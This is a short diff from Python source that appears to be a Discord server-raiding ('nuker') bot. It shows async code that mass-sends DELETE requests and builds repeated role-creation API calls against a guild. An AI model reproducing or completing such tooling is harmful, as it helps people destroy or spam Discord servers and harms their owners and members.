@@ -84,7 +84,7 @@ class Fucker:
         async with ClientSession(headers=self.headers, connector=None) as session:
             await create_tasks(urls, session.delete, self.headers)
 
-    async def crRoles(self, ctx, name=f"{NAME}teamfuckyo"):
+    async def crRoles(self, ctx):
         urls = [
             f"https://discord.com/api/v8/guilds/{self.ctx.guild.id}/roles"
             for _ in range(20)
